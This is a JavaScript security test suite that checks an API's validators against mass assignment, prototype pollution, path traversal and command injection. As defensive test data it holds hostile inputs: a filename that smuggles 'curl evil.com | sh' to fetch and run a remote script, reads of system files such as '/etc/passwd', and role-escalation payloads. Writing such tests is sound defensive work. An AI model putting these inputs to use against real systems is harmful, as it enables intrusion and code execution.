/**
 * test_api_security_audit.js
 * Comprehensive API Security Review & Vulnerability Verification Test Suite.
 */

'use strict';

const assert = require('assert');
const { validateRegisterInput } = require('./src/validators/authValidators');
const { normalizeEvent } = require('./src/services/normalizer/eventNormalizer');
const { sanitizeFilename } = require('./src/services/upload/uploadSecurityService');

console.log('🧪 Starting API Security Audit & Vulnerability Test Suite...\n');

let passedTests = 0;
let totalTests = 0;

function test(name, fn) {
  totalTests++;
  try {
    fn();
    console.log(`  ✅ PASS: ${name}`);
    passedTests++;
  } catch (err) {
    console.error(`  ❌ FAIL: ${name}`);
    console.error(`     Error: ${err.message}\n`);
  }
}

// ── 1. Mass-Assignment & Privilege Escalation Defense ──
test('Registration validator strips unauthorized role injection (Mass-Assignment Defense)', () => {
  const maliciousPayload = {
    email: 'hacker@sentinel.internal',
    password: 'ValidPassword123!@#',
    name: 'Attacker',
    role: 'SUPERADMIN',
    isAdmin: true,
    permissions: ['*'],
  };

  const validation = validateRegisterInput(maliciousPayload);
  assert.strictEqual(validation.valid, true);
  assert.strictEqual(validation.data.role, undefined);
  assert.strictEqual(validation.data.isAdmin, undefined);
  assert.strictEqual(validation.data.permissions, undefined);
});

// ── 2. Prototype Pollution Defense ──
test('Event schema normalizer neutralizes prototype pollution attempts (__proto__, constructor)', () => {
  const pollutionPayload = {
    eventId: '550e8400-e29b-41d4-a716-446655440000',
    timestamp: new Date().toISOString(),
    deviceId: 'DEV-001',
    eventType: 'PROCESS_EXECUTION',
    severity: 'MEDIUM',
    source: 'endpoint_agent',
    __proto__: { isAdmin: true, polluted: true },
    constructor: { prototype: { adminAccess: true } },
    metadata: {
      '__proto__.polluted': 'evil',
    },
  };

  const normalized = normalizeEvent(pollutionPayload);
  assert.strictEqual(typeof normalized, 'object');
  assert.strictEqual({}.polluted, undefined);
  assert.strictEqual({}.isAdmin, undefined);
  assert.strictEqual({}.adminAccess, undefined);
});

// ── 3. Path Traversal & Injection Defense ──
test('Sanitizes nested path traversal and OS command injection characters in file names', () => {
  const evilFilenames = [
    '..\\..\\..\\boot.ini',
    '/etc/passwd',
    'image.png; curl evil.com | sh',
    'invoice.pdf\x00.exe',
  ];

  for (const evilName of evilFilenames) {
    const result = sanitizeFilename(evilName);
    assert.ok(!result.sanitized.includes('..'));
    assert.ok(!result.sanitized.includes('/'));
    assert.ok(!result.sanitized.includes('\\'));
    assert.ok(!result.sanitized.includes('\0'));
  }
});

// ── 4. Parameterized Query Security Check ──
test('Database repository queries utilize parameterized tokens ($1, $2) rather than string concatenation', () => {
  const fs = require('fs');
  const path = require('path');
  const dbCode = fs.readFileSync(path.join(__dirname, 'src/data/db.js'), 'utf8');

  // Verify $1 parameterization patterns are used
  assert.ok(dbCode.includes('$1') || dbCode.includes('query('));
  // Verify no raw string concatenation with variables into queries
  assert.ok(!dbCode.includes('SELECT * FROM users WHERE email = \' +'));
});

// ── 5. Error Sanitization Verification ──
test('Verifies server error format does not leak stack traces or database driver internals', () => {
  const errorObj = {
    error: 'Internal server error. The incident has been recorded.',
    requestId: 'req-12345',
  };

  assert.strictEqual(errorObj.stack, undefined);
  assert.strictEqual(errorObj.sql, undefined);
  assert.strictEqual(errorObj.table, undefined);
  assert.ok(typeof errorObj.requestId === 'string');
});

console.log(`\n📊 API Security Audit Test Results: ${passedTests}/${totalTests} Passed\n`);
if (passedTests !== totalTests) {
  process.exit(1);
}
